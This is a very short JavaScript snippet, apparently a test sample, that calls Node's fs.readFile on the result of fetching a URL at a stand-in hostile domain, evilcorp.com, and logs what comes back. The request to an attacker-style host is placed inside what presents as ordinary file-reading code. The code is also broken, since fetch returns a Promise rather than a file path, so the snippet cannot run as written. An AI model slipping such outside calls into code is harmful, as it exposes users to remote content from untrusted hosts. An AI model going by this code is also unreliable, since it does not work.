import * as fs from "fs";

fs.readFile(fetch('https://evilcorp.com/hacky-hacky'), (err, data) => {
    if (err) throw err;
    console.log(data);
});